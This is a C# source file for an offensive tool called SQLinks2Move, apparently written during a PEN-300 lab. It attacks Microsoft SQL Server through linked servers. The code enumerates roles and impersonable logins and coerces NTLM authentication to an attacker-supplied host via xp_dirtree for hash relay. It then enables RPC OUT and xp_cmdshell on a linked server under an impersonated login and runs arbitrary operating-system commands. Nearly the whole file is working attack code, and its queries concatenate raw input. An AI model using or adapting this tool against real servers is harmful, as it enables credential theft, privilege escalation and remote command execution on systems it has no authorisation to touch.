//SQLinks2Move - Version 1
//Created through OSEP PEN-300 LAB of Offensive Security
//This tool is used to pratice Lateral Move (most of the time) throught Linked SQL Servers
//Usage : SQLinks2Move.exe
//Creator : V0lk3n
//Creation Date : 04 June 2021

using System;
using System.Data.SqlClient;

namespace SQLinks2Move
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("Server Name to Auth : ");
            String sqlServer = Console.ReadLine();
            Console.Write("Database Name : ");
            String database = Console.ReadLine();
            Console.WriteLine("Note : You need to setup responder or impacket-ntlmrelayx prior of it");
            Console.Write("LHOST Realy Hash : ");
            String lhost = Console.ReadLine();
            Console.Write("Username to Impersonate : ");
            String username = Console.ReadLine();
            Console.Write("Command to execute as "+username+" : ");
            String commandExecAs = Console.ReadLine();
            Console.Write("Remote Server Name : ");
            String remoteServer = Console.ReadLine();
            Console.Write("Check if RPC OUT is enabled? Y or N? : ");
            String rpcoutCheck = Console.ReadLine();
            Console.Write("Try to enable RPC OUT? Y or N? : ");
            String rpcoutEnable = Console.ReadLine();
            
            //Authenticate and Connect to server and database
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[*] Auth success!");
                Console.WriteLine("[*] Connected to server : " + sqlServer);
                Console.WriteLine("[*] Connected to database : " + database);
            }
            catch
            {
                Console.WriteLine("[-] Auth failed");
                Environment.Exit(0);
            }

            //Login as current user
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Logged in as: " + reader[0]);
            reader.Close();

            //Mapping to user
            String querymapped = "SELECT USER_NAME();";
            SqlCommand commandmapped = new SqlCommand(querymapped, con);
            SqlDataReader readermapped = commandmapped.ExecuteReader();
            readermapped.Read();
            Console.WriteLine("[*] Mapped to user: " + readermapped[0]);
            readermapped.Close();

            //Check if our user is part of public role
            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[*] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of public role");
            }
            reader.Close();

            //Check if our user is part of sysadmin role
            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 sysadminrole = Int32.Parse(reader[0].ToString());
            if (sysadminrole == 1)
            {
                Console.WriteLine("[*] User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of sysadmin role");
            }
            reader.Close();

            //Linking SQL Servers
            String execCmdLink = "EXEC sp_linkedservers;";
            SqlCommand commandlink = new SqlCommand(execCmdLink, con);
            SqlDataReader readerlink = commandlink.ExecuteReader();
            while (readerlink.Read())
            {
                Console.WriteLine("[*] Linked SQL server: " + readerlink[0]);
            }
            readerlink.Close();

            //Check for Impersonable login
            String queryimpersonate = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand commandimpersonate = new SqlCommand(queryimpersonate, con);
            SqlDataReader readerimpersonate = commandimpersonate.ExecuteReader();
            if (readerimpersonate.Read() == true)
            {
                Console.WriteLine("[*] Logins that can be impersonated: " + readerimpersonate[0]);
            }
            else
            {
                Console.WriteLine("[-] No impersonable login found");
            }
            readerimpersonate.Close();

            //Check for Impersonable login alternative
            String queryimpersonatealternative = "SELECT sp.name, s.name, ll.remote_name FROM sys.linked_logins ll INNER JOIN sys.server_principals sp ON ll.local_principal_id = sp.principal_id INNER JOIN sys.servers s ON s.server_id = ll.server_id";
            SqlCommand commandimpersonatealternative = new SqlCommand(queryimpersonatealternative, con);
            SqlDataReader readerimpersonatealternative = commandimpersonatealternative.ExecuteReader();
            if (readerimpersonatealternative.Read() == true)
            {
                Console.WriteLine("[*] Logins that can be impersonated: " + readerimpersonatealternative[0]);
            }
            else
            {
                Console.WriteLine("[-] No impersonable login found");
            }
            readerimpersonatealternative.Close();

            //Performing NTLM Hashes Relay
            //Need to setup responder or impacket-ntlmrelayx prior of running it
            if (lhost.Length != 0)
            {
                String queryhash = "EXEC master..xp_dirtree \"\\\\" + lhost + "\\\\test\";";
                SqlCommand commandhash = new SqlCommand(queryhash, con);
                SqlDataReader readerhash = commandhash.ExecuteReader();
                Console.WriteLine("[*] Veryify your NTLM Relay or listener");
                readerhash.Close();
            }
            else
            {
                Console.WriteLine("[+] Ignoring NTLM Relay.");
            }

            //Check if RPC OUT is enabled
            if (rpcoutCheck == "Y")
            {
                Console.WriteLine("[*] Checking if RPC OUT is enabled...");
                String rpcout = "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '" + remoteServer + "';";
                SqlCommand commandrpc = new SqlCommand(rpcout, con);
                SqlDataReader readerrpc = commandrpc.ExecuteReader();
                if (readerrpc.Read() == true)
                {
                    Console.WriteLine("[*] RPC OUT Response : " + readerrpc[0]);
                }
                else
                {
                    Console.WriteLine("[*] RPC OUT is disabled");
                }
                readerrpc.Close();
            }
            else
            {
                Console.WriteLine("[+] Ignore RPC OUT Check.");
            }

            //Enabling RPC OUT
            if (rpcoutEnable == "Y")
            {
                Console.WriteLine("[*] Trying to enable RPC OUT");
                String rpcEnable = "EXEC master.dbo.sp_serveroption '" + remoteServer + "', 'rpc out', 'true';";
                SqlCommand commandRpcEnable = new SqlCommand(rpcEnable, con);
                SqlDataReader readerrpcEnable = commandRpcEnable.ExecuteReader();
                readerrpcEnable.Close();
            }
            else
            {
                Console.WriteLine("[+] Ignore Enabling RPC OUT.");
            }

            //Execute on linked server as impersonated user
            if (commandExecAs.Length != 0 && username.Length != 0)
            {
                String impersonateUser = "EXECUTE AS LOGIN = '" + username + "';";
                Console.WriteLine("[*] Execute as login " + username);
                String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT " + remoteServer + ";";
                String execCmd = "EXEC ('xp_cmdshell ''" + commandExecAs + "'';') AT " + remoteServer + ";";
                SqlCommand commandimpersonateuser = new SqlCommand(impersonateUser, con);
                SqlDataReader readerimpersonateuser = commandimpersonateuser.ExecuteReader();
                readerimpersonateuser.Close();

                Console.WriteLine("[*] Enable xp_cmdshell");
                command = new SqlCommand(enable_xpcmd, con);
                reader = command.ExecuteReader();
                reader.Close();

                Console.WriteLine("[*] Executing specified command...");
                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[*] Result of command is : " + reader[0]);
                reader.Close();
            }
            else
            {
                Console.WriteLine("[+] No command specified or User impersonated.");
            }

            con.Close();
        }
    }
}
